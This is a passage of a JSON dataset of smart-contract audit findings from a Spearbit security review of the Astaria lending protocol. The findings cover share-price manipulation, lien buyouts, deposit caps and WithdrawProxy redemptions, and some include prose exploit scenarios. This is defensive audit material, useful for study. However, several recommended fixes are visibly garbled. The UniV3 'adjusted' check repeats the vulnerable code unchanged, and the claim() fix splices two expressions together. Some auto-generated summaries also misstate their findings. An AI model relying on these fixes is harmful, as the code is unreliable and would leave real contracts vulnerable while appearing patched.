      "content": "## ERC4626 Clone Analysis\n\n## Severity\n**Medium Risk**\n\n## Context\n`ERC4626-Cloned.sol#L130`\n\n## Description\nAside from storage layout/getters, the context above notes the other major departure from Solmate's ERC4626 implementation. The modification requires the initial mint to cost 10 full WETH.\n\n### Code Snippet\n```solidity\nfunction mint(\n    uint256 shares,\n    address receiver\n) public virtual returns (uint256 assets) {\n    // assets is 10e18, or 10 WETH, whenever totalSupply() == 0\n    assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n    // Need to transfer before minting or ERC777s could reenter.\n    // minter transfers 10 WETH to the vault\n    ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);\n    // shares received are based on user input\n    _mint(receiver, shares);\n    emit Deposit(msg.sender, receiver, assets, shares);\n    afterDeposit(assets, shares);\n}\n```\n\nAstaria highlighted that the code diff from Solmate is in relation to this finding from the previous Sherlock audit. However, the deposit is still unchanged, and the initial deposit may be 1 wei worth of WETH, in return for 1 wad worth of vault shares.\n\nFurthermore, the previously cited issue may still surface by calling `mint` in a way that sets the price per share high (e.g., 10 shares for 10 WETH produces a price per of 1:1e18). Albeit, it comes at a higher cost to the minter to set the initial price that high.\n\n## Recommendation\n- Revert the hardcoding of `10e18` in `previewMint` and `previewWithdraw`; this will require the first minting to be at a 1:1 asset to share price.\n- Prevent share price manipulation by adding a condition in each of `mint` and `deposit` that reverts if `assets` (when depositing) or `shares` (when minting) are not above the minimum asset amount when `totalSupply() == 0`. This comes at the cost of a duplicate storage read.\n\nFor WETH vaults, the minimum asset amount for the initial deposit can be a small amount, such as 100 gwei, so long as shares are issued 1:1 for the first mint/deposit.",
      "summary": "\nThis bug report is about an issue with the ERC4626-Cloned.sol#L130 code. The modification requires the initial mint to cost 10 full WETH, but the deposit is still unchanged and the initial deposit may be 1 wei worth of WETH, in return for 1 wad worth of vault shares. This issue may still surface by calling mint in a way that sets the price per share high. \n\nThe recommendation is to revert the hardcoding of 10e18 in previewMint and previewWithdraw, so that the first minting is 1:1 asset to share price. To prevent share price manipulation, a condition should be added in each of mint and deposit reverting if assets (when depositing) or shares (when minting) are not above the minimum asset amount when totalSupply() == 0. This comes at the cost of a duplicate storage read. For WETH vaults, the minimum asset amount for initial deposit can be a small amount, such as 100 gwei so long as shares are issued 1:1 for the first mint/deposit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "First Depositor Issue"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7320",
      "title": "Liens cannot be bought out once we've reached the maximum number of active liens on one collateral",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nLienToken.sol#L373-375\n\n## Description\nThe `buyoutLien` function is intended to transfer ownership of a lien from one user to another. In practice, it creates a new lien by calling `_createLien` and then calls `_replaceStackAtPositionWithNewLien` to update the stack.\n\nIn the `_createLien` function, there is a check to ensure we don't take out more than `maxLiens` against one piece of collateral:\n\n```solidity\nif (params.stack.length >= s.maxLiens) {\n    revert InvalidState(InvalidStates.MAX_LIENS);\n}\n```\n\nThe result is that, when we already have `maxLiens` and we try to buy one out, this function will revert.\n\n## Recommendation\nMove this check from `_createLien` into the `_appendStack` function, which is only called when new liens are created rather than when they are bought out.\n\n## Astaria\nFixed in PR 213.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is about the buyoutLien function in the LienToken.sol file. The buyoutLien function is intended to transfer ownership of a lien from one user to another, but it was not working properly. The function calls the _createLien function, which has a check to ensure that no more than maxLiens can be taken out against one piece of collateral. This check was causing the function to revert when a user tried to buy out a lien when they already had maxLiens. The recommendation was to move this check from the _createLien function to the _appendStack function, which is only called when new liens are created rather than when they are bought out. The bug was fixed in PR 213 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Min/Max Cap Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7319",
      "title": "Lien buyouts can push maxPotentialDebt over the limit",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nLienToken.sol#L143-148\n\n## Description\nWhen a lien is bought out, `_buyoutLien` calls `_getMaxPotentialDebtForCollateral` to confirm that this number is lower than the `maxPotentialDebt` specified in the lien. However, this function is called with the existing stack, which hasn't yet replaced the lien with the new, bought out lien. Valid refinances can make the rate lower or the time longer. In the case that a lien was bought out for a longer duration, `maxPotentialDebt` will increase and could go over the limit specified in the lien.\n\n## Recommendation\nPerform this check after the old lien has been replaced by the new lien in the stack.\n\n## Astaria\nFixed in PR 211.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is related to the LienToken.sol#L143-148. When a lien is bought out, the _buyoutLien calls_getMaxPotentialDebtForCollateral to confirm that the number is lower than the maxPotentialDebt specified in the lien. However, this function is called with the existing stack which has not yet replaced the lien with the new, bought out lien. This could cause issues as valid refinances can make the rate lower or the time longer. In the case that a lien was bought out for a longer duration, maxPotentialDebt will increase and could go over the limit specified in the lien.\n\nTo fix this issue, the check should be performed after the old lien has been replaced by the new lien in the stack. This issue was fixed in PR 211 and Spearbit verified it.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7318",
      "title": "redeemFutureEpoch transfers the shares from the msg.sender to the vault instead of from the owner",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`PublicVault.sol#L143`\n\n## Description\n`redeemFutureEpoch` transfers the vault shares from the `msg.sender` to the vault instead of from the owner.\n\n## Recommendation\nThe 1st parameter passed to the `ERC20(address(this)).safeTransferFrom` needs to be the owner:\n\n```solidity\n- ERC20(address(this)).safeTransferFrom(msg.sender, address(this), shares);\n+ ERC20(address(this)).safeTransferFrom(owner, address(this), shares);\n```\n\n## Astaria\nFixed in `443b0e01263755a64c98e3554b43a8fbfa1de215`.\n\n## Spearbit\nVerified.",
      "summary": "\nA bug was reported in PublicVault.sol on line 143. The bug was that the redeemFutureEpoch function was transferring the vault shares from the message sender to the vault instead of from the owner. This posed a medium risk. To fix the bug, the first parameter passed to the ERC20(address(this)).safeTransferFrom needs to be the owner instead of the message sender. This has been fixed in the code at 443b0e01263755a64c98e3554b43a8fbfa1de215 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7317",
      "title": "assets < s.depositCap invariant can be broken for public vaults with non-zero deposit caps",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- PublicVault.sol#L207-L208\n- PublicVault.sol#L231-L232\n\n## Description\nThe following check in `mint` / `deposit` does not take into consideration the new shares / amount supplied to the endpoint, since the `yIntercept` in `totalAssets()` is only updated after calling `super.mint(shares, receiver)` or `super.deposit(amount, receiver)` with the `afterDeposit` hook.\n\n```solidity\nuint256 assets = totalAssets();\nif (s.depositCap != 0 && assets >= s.depositCap) {\n    revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED);\n}\n```\n\nThus the new shares or amount provided can be a really big number compared to `s.depositCap`, but the call will still go through.\n\n## Recommendation\nTo have the inequality `assets < s.depositCap` to be always correct, we would need to calculate the to-be-updated value of `assets` beforehand and then perform the check.",
      "summary": "\nThis bug report is about a check in the mint/deposit functions of the PublicVault.sol file which does not take into consideration the new shares/amount supplied to the endpoint. This means that the new shares/amount provided can be a really big number compared to s.depositCap, but the call will still go through. To fix this issue, it is recommended that the inequality assets < s.depositCap should be calculated beforehand and then the check should be performed.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Bypass limit"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7316",
      "title": "Expired liens taken from public vaults need to be liquidated otherwise processing an epoch halts/reverts",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n**Severity:** Medium Risk  \n**Context:** PublicVault.sol#L275-L277  \n\n## Description\n`s.epochData[s.currentEpoch].liensOpenForEpoch` is decremented or is supposed to be decremented when for a lien with an end that falls on this epoch:\n\n- The full payment has been made,\n- Or the lien is bought out by a lien that is from a different vault or ends at a higher epoch,\n- Or the lien is liquidated.\n\nIf for some reason a lien expires and no one calls `liquidate`, then `s.epochData[s.currentEpoch].liensOpenForEpoch > 0` will be true, and `processEpoch()` would revert until someone calls `liquidate`.\n\nNote that a lien's end falling in the `s.currentEpoch` and `timeToEpochEnd() == 0` imply that the lien is expired.\n\n## Recommendation\nAstaria would need to have a monitoring solution set up to make sure the `liquidate` endpoint gets called for expired liens without delay.\n\n**Astaria:** Acknowledged.  \n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is about an issue with the PublicVault.sol code, which is part of the Astaria and Spearbit services. The issue is that if a lien expires and no one calls the liquidate function, then the s.epochData[s.currentEpoch].liensOpenForEpoch will remain true and the processEpoch() function will revert until someone calls liquidate. This is because a lien's end falling in the s.currentEpoch andtimeToEpochEnd() == 0 imply that the lien is expired. The severity of this bug is medium risk.\n\nThe recommendation for this bug is for Astaria to have a monitoring solution setup to make sure the liquidate endpoint gets called for expired liens without delay. Both Astaria and Spearbit have acknowledged this bug.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7315",
      "title": "Call to Royalty Engine can block NFT auction",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`CollateralToken.sol#L481`\n\n## Description\n`_generateValidOrderParameters()` calls `ROYALTY_ENGINE.getRoyaltyView()` twice. The first call is wrapped in a try/catch. This allows Astaria to continue even if the `getRoyaltyView()` reverts. However, the second call is not safe from this.\n\nBoth these calls have the same parameters passed to them except the price (`startingPrice` vs `endingPrice`). In case they are different, there exists a possibility that the second call can revert.\n\n## Recommendation\nWrap the second call in a try/catch. In case of a revert, the execution will be transferred to an empty catch block. Here is a sample:\n\n```solidity\nif (foundRecipients.length > 0) {\n    try\n        s.ROYALTY_ENGINE.getRoyaltyView(\n            underlying.tokenContract,\n            underlying.tokenId,\n            endingPrice\n        ) returns (, uint256[] memory foundEndAmounts) {\n            recipients = foundRecipients;\n            royaltyStartingAmounts = foundAmounts;\n            royaltyEndingAmounts = foundEndAmounts;\n        } catch {}\n}\n```\n\n## Astaria\nAcknowledged. We have a change pending that removes the royalty engine as a part of multi token.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the CollateralToken.sol#L481. It states that the function _generateValidOrderParameters() calls the ROYALTY_ENGINE.getRoyaltyView() twice. The first call is wrapped in a try/catch, which allows Astaria to continue even if the getRoyaltyView() reverts. The second call, however, is not safe from this. Both calls have the same parameters passed to it, except for the price (startingPrice vs endingPrice). If these are different, there is a possibility that the second call can revert.\n\nThe recommendation is to wrap the second call in a try/catch. If it reverts, the execution will be transferred to an empty catch block. Astaria has acknowledged this and has a change pending that removes the royalty engine as part of multi token. Spearbit has also acknowledged this.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7314",
      "title": "claim() will underflow and revert for all tokens without 18 decimals",
      "impact": "MEDIUM",
      "content": "## Severity\nMedium Risk\n\n## Context\nWithdrawProxy.sol#238-244\n\n## Description\nIn the `claim()` function, the amount to decrease the Y intercept of the vault is calculated as:\n\n```\n(s.expected - balance).mulWadDown(10**ERC20(asset()).decimals() - s.withdrawRatio)\n```\n\n`s.withdrawRatio` is represented as a WAD (18 decimals). As a result, using any token with a number of decimals under 17 (assuming the withdraw ratio is greater than 10%) will lead to an underflow and cause the function to revert.\n\nIn this situation, the token's decimals don't matter. They are captured in `s.expected` and `balance`, and are also the scale at which the vault's y-intercept is measured, so there's no need to adjust for them.\n\n**Note**: I know this isn't a risk in the current implementation, since it's WETH only, but since you are planning to generalize to accept all ERC20s, this is important.\n\n## Recommendation\n```solidity\nif (balance < s.expected) {\n    PublicVault(VAULT()).decreaseYIntercept(\n        (s.expected - balance).mulWadDown(\n            -10**ERC20(asset()).decimals() - s.withdrawRatio\n            + 1e18 - s.withdrawRatio\n        )\n    );\n}\n```",
      "summary": "\nThis bug report is about the \"claim()\" function in the WithdrawProxy.sol code. The issue is that if the number of decimals in the token is under 17 and the withdraw ratio is greater than 10%, it will lead to an underflow and cause the function to revert. The recommendation is to adjust the code to include a \"+ 1e18 - s.withdrawRatio\" to the calculation of the amount to decrease the Y intercept of the vault. This will ensure that the token's decimals don't matter and the vault's y-intercept is measured correctly. This bug report is important because the code is planned to be generalized to accept all ERC20s.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7313",
      "title": "If auction time is reduced, withdrawProxy can lock funds from final auctions",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\nWithdrawProxy.sol#L295\n\n## Description\nWhen a new liquidation happens, the `withdrawProxy` sets `s.finalAuctionEnd` to be equal to the new incoming auction end. This will usually be fine, because new auctions start later than old auctions, and they all have the same length. However, if the auction time is reduced on the Router, it is possible for a new auction to have an end time that is sooner than an old auction. The result will be that the WithdrawProxy is claimable before it should be, and then will lock and not allow anyone to claim the funds from the final auction.\n\n## Recommendation\nReplace this with a check like:\n```solidity\nuint40 auctionEnd = (block.timestamp + finalAuctionDelta).safeCastTo40();\nif (auctionEnd > s.finalAuctionEnd) s.finalAuctionEnd = auctionEnd;\n```\n\n## Status\n**Astaria:** Fixed in commit 050487.  \n**Spearbit:** Verified.",
      "summary": "\nThis bug report is about the WithdrawProxy.sol file, which is located at line 295. When a new liquidation occurs, the withdrawProxy sets s.finalAuctionEnd to be equal to the new incoming auction end. This would usually be fine, as new auctions start later than old auctions, and they all have the same length. However, if the auction time is reduced on the Router, it is possible for a new auction to have an end time that is sooner than an old auction. This would result in the WithdrawProxy being claimable before it should be, and then it will lock and not allow anyone to claim the funds from the final auction.\n\nTo fix this, the code should be replaced with a check like: uint40 auctionEnd = (block.timestamp + finalAuctionDelta).safeCastTo40(); if (auctionEnd > s.finalAuctionEnd) s.finalAuctionEnd = auctionEnd;. This was fixed by Astaria in commit 050487, and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7312",
      "title": "UniV3 tokens with fees can bypass strategist checks",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`UNI_V3Validator.sol#L117-119`\n\n## Description\nEach UniV3 strategy includes a value for `feeinnlrDetails` that is used to constrain their strategy to UniV3 pools with matching fees. This is enforced with the following check (where `details.fee` is the strategist's set fee, and `fee` is the fee returned from Uniswap):\n\n```solidity\nif (details.fee != uint24(0) && fee != details.fee) {\n    revert InvalidFee();\n}\n```\n\nThis means that if you set `details.fee` to 0, this check will pass, even if the real fee is greater than zero.\n\n## Recommendation\nIf this is the intended behavior and you would like strategists to have a number they can use to accept all fee levels, I would recommend choosing a number other than zero (since it's a realistic value that strategists may want to set fees for). Otherwise, adjust the check as follows:\n\n```solidity\nif (details.fee != uint24(0) && fee != details.fee) {\n    revert InvalidFee();\n}\n```\n\nTo enhance flexibility, you could also allow all fees lower than the strategist set fee to be acceptable:\n\n```solidity\nif (details.fee != uint24(0) && fee != details.fee) {\n    revert InvalidFee();\n}\n```\n\nChange to:\n\n```solidity\nif (fee > details.fee) {\n    revert InvalidFee();\n}\n```",
      "summary": "\nA bug report has been submitted for UNI_V3Validator.sol#L117-119. The bug is of medium risk and is related to the value for feeinnlrDetails that is used to constrain strategies to UniV3 pools with matching fees. The current code allows strategists to set details.fee to 0 and the check will pass, even if the real fee is greater than zero.\n\nThe recommendation is to choose a number other than zero as it is a realistic value that strategists may want to set fees for. Alternatively, the check can be adjusted to allow all fees lower than the strategist set fee to be acceptable.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7311",
      "title": "Multiple ERC4626Router and ERC4626RouterBase functions will always revert",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `ERC4626Router.sol#L49-58`\n- `ERC4626RouterBase.sol#L47`\n- `ERC4626RouterBase.sol#L60`\n\n## Description\nThe intention of the `ERC4626Router.sol` functions is that they are approval-less ways to deposit and redeem:\n\n> For the below, no approval needed, assumes vault is already max approved.\n\nAs long as the user has approved the `TRANSFER_PROXY` for WETH, this works for the `depositToVault` function:\n- WETH is transferred from the user to the router with `pullTokens`.\n- The router approves the vault for the correct amount of WETH.\n- `vault.deposit()` is called, which uses `safeTransferFrom` to transfer WETH from the router into the vault.\n\nHowever, for the `redeemMax` function, it doesn't work:\n- Approves the vault to spend the router's WETH.\n- `vault.redeem()` is called, which tries to transfer vault tokens from the router to the vault, and then mints withdraw proxy tokens to the receiver.\n\nThis error occurs assuming that the vault tokens would be burned, in which case the logic would work. But since they are transferred into the vault until the end of the epoch, we require approvals.\n\nThe same issue also exists in these two functions in `ERC4626RouterBase.sol`:\n- `redeem()`: this is where the incorrect approval lives, so the same issue occurs when it is called directly.\n- `withdraw()`: the same faulty approval exists in this function.\n\n## Recommendation\n`redeemMax` should follow the same flow as `deposit` to make this work:\n- `redeemMax` should `pullTokens` to pull the vault tokens from the user.\n- The router should approve the vault to spend its own tokens, not WETH.\n- Then we can call `vault.redeem()` and it will work as intended.\n\nBoth the `ERC4626RouterBase` functions should change the approval to be vault tokens rather than WETH:\n```diff\n- ERC20(vault.asset()).safeApprove(address(vault), amount);\n+ vault.safeApprove(address(vault), amount);\n```",
      "summary": "\nThis bug report is about the ERC4626Router.sol and ERC4626RouterBase.sol functions not working as intended. The intention of the functions is to allow deposit and redemption of funds without needing an approval, but this is not working as expected.\n\nThe depositToVault function works as intended, with WETH being transferred from the user to the router, then the router approving the vault for the correct amount of WETH, and finally vault.deposit() being called to transfer the WETH from the router into the vault.\n\nHowever, the redeemMax function does not work as expected. The router approves the vault to spend its WETH, then vault.redeem() is called, which tries to transfer vault tokens from the router to the vault, and then mints the withdraw proxy tokens to the receiver. This does not work because the vault tokens need to be approved for transfer.\n\nThe same issue exists in the redeem() and withdraw() functions in ERC4626RouterBase.sol.\n\nThe recommendation is that the redeemMax function should follow the same flow as depositToVault, and that the ERC4626RouterBase functions should change the approval to be vault tokens rather than WETH.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "WETH",
        "ERC4626",
        "Approve"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7310",
      "title": "unchecked may cause under/overflows",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `LienToken.sol#L424`\n- `LienToken.sol#L482`\n- `PublicVault.sol#L376`\n- `PublicVault.sol#L422`\n- `PublicVault.sol#L439`\n- `PublicVault.sol#L490`\n- `PublicVault.sol#L578`\n- `PublicVault.sol#L611`\n- `PublicVault.sol#L527`\n- `PublicVault.sol#L544`\n- `PublicVault.sol#L563`\n- `PublicVault.sol#L640`\n- `VaultImplementation.sol#L401`\n- `WithdrawProxy.sol#L254`\n- `WithdrawProxy.sol#L293`\n\n## Description\nUnchecked should only be used when there is a guarantee of no underflows or overflows, or when they are taken into account. In the absence of certainty, it's better to avoid unchecked to favor correctness over gas efficiency.\n\nFor instance, if by error, `protocolFeeNumerator` is set to be greater than `protocolFeeDenominator`, this block in `_handleProtocolFee()` will underflow:\n\n```solidity\nunchecked {\n    amount -= fee;\n}\n```\n\nHowever, later this reverts due to the ERC20 transfer of an unusually high amount. This is just to demonstrate that unknown bugs can lead to under/overflows.\n\n## Recommendation\nReason about each unchecked and remove them in absence of absolute certainty of safety.\n\n## Astaria\nAcknowledged. We'll put checks on setting protocol values to not cross unintended boundaries.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about unchecked code in the LienToken.sol, PublicVault.sol, VaultImplementation.sol, and WithdrawProxy.sol files. Unchecked code should only be used when there is certainty that it will not cause underflows or overflows. In this report, a potential underflow is described in the _handleProtocolFee() block due to an error in setting the protocolFeeNumerator. It is recommended to reason about each unchecked code and remove them if there is not absolute certainty that it is safe to use. The Astaria and Spearbit teams have acknowledged the bug and will put checks in place to prevent unintended boundaries from being crossed.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7309",
      "title": "Point.position is not updated for stack slots in_removeStackPosition",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- LienToken.sol#L402\n- LienToken.sol#L809\n\n## Description\nIn `_createLien`, when a new stack slot is created, the `newSlot.point.position` is set to `uint8(params.stack.length)`, which would be its index in the stack. When `_removeStackPosition` is called to remove a slot from the stack at index position, the `newStack[i].point.position` is not updated for indexes that are greater than the position in the original stack. \n\nAlso, `slot.point.position` is only used when we emit `AddLien` and `LienStackUpdated` events. In both of those cases, we could have used `params.stack.length`.\n\n## Recommendation\nIf it is necessary to keep `slot.point.position` due to future upgrades, make sure to update `_removeStackPosition` so that it updates the positions as well. Otherwise, `slot.point.position` can be removed.\n\n## Astaria\nIssue is fixed in commit `fa175c` by removing the `slot.point.position`.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report concerns the LienToken.sol file, specifically lines 402 and 809. When a new stack slot is created in the In_createLien function, the newSlot.point.position is set to its index in the stack. However, when the _removeStackPosition function is called to remove a slot from the stack, the newStack[i].point.position is not updated for indexes that are greater than the position in the original stack. Additionally, slot.point.position is only used when emitting AddLien and LienStackUpdated events.\n\nThe recommendation is to either update the _removeStackPosition function to update the positions, or to remove slot.point.position altogether. The issue was fixed in commit fa175c by removing the slot.point.position. This fix was verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7308",
      "title": "WithdrawProxy allows redemptions before PublicVault callstransferWithdrawReserve",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n`WithdrawProxy.sol#L172-L175`\n\n## Description\nAnytime there is a withdrawal pending (i.e., someone holds WithdrawProxy shares), shares may be redeemed as long as `totalAssets() > 0` and `s.finalAuctionEnd == 0`. Under normal operating conditions, `totalAssets()` becomes greater than 0 when the `PublicVault` calls `transferWithdrawReserve`. \n\n`totalAssets()` can also be increased to a non-zero value by anyone transferring WETH to the contract. If this occurs and a user attempts to redeem, they will receive a smaller share than they are owed.\n\n### Exploit Scenario\n- Depositor redeems from `PublicVault` and receives WithdrawProxy shares.\n- Malicious actor deposits a small amount of WETH into the WithdrawProxy.\n- Depositor accidentally redeems, or is tricked into redeeming, from the WithdrawProxy while `totalAssets()` is smaller than it should be.\n- `PublicVault` properly processes epoch and full `withdrawReserve` is sent to the WithdrawProxy.\n- All remaining holders of WithdrawProxy shares receive an outsized share as the previous shares were redeemed for the incorrect value.\n\n## Recommendation\n\n### Option 1\nConsider being explicit in opening the WithdrawProxy for redemptions (`redeem/withdraw`) by requiring `s.withdrawReserveReceived` to be a non-zero value:\n\n```solidity\nif (s.finalAuctionEnd != 0) {\n    // Updated condition\n    if (s.finalAuctionEnd != 0 || s.withdrawReserveReceived == 0) {\n        // if finalAuctionEnd is 0, no auctions were added\n        revert InvalidState(InvalidStates.NOT_CLAIMED);\n    }\n}\n```\nAstaria notes there is a second scenario where funds are sent to the WithdrawProxy: auction payouts. For the above recommendation to be complete, auction payouts or claiming MUST also set `withdrawReserveReceived`.\n\n### Option 2\nInstead of inferring when it is safe to withdraw based on `finalAuctionEnd` and `withdrawReserveReceived`, consider explicitly marking the withdrawals as open when it is both safe to withdraw (i.e., expected funds deposited) and the vault has claimed its share.",
      "summary": "\nThis bug report is about the WithdrawProxy.sol#L172-L175. It states that if anyone transfers WETH to the contract, totalAssets() will become greater than 0, and if someone attempts to redeem their shares then they will receive a smaller share than they are owed. It then explains the exploit scenario and provides two recommendations. \n\nThe first recommendation is to consider being explicit in opening the WithdrawProxy for redemptions by requiring s.withdrawReserveReceived to be a non-zero value. The second recommendation is to explicitly mark the withdraws as open when it is both safe to withdraw and the vault has claimed its share. \n\nIn conclusion, this bug report is about a vulnerability in the WithdrawProxy.sol#L172-L175 that can lead to a malicious actor manipulating the totalAssets() and resulting in users receiving a smaller share than they are owed. It provides two recommendations to fix the issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic",
        "Validation",
        "EIP-4626",
        "ERC4626"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7307",
      "title": "LienToken payee not reset on transfer",
      "impact": "HIGH",
      "content": "## Security Analysis Report\n\n## Severity: High Risk\n\n### Context\n`LienToken.sol#L303-L313`\n\n### Description\nThe `payee` and `ownerOf` functionalities are detached, meaning that owners may set a `payee`, and the owner may transfer the `LienToken` to a new owner without affecting the `payee`. The `payee` does not reset upon transfer.\n\n### Exploit Scenario\n- Owner of a `LienToken` sets themselves as `payee`.\n- Owner of `LienToken` sells the lien to a new owner.\n- New owner does not update `payee`.\n- Payments go to the address set by the old owner.\n\n### Recommendation\nReset `payee` on transfer.\n\n```solidity\nfunction transferFrom(\n    address from,\n    address to,\n    uint256 id\n) public override(ERC721, IERC721) {\n    LienStorage storage s = _loadLienStorageSlot();\n    if (s.lienMeta[id].atLiquidation) {\n        revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n    }\n    + delete s.lienMeta[id].payee;\n    + emit PayeeChanged(id, address(0));\n    super.transferFrom(from, to, id);\n}\n```",
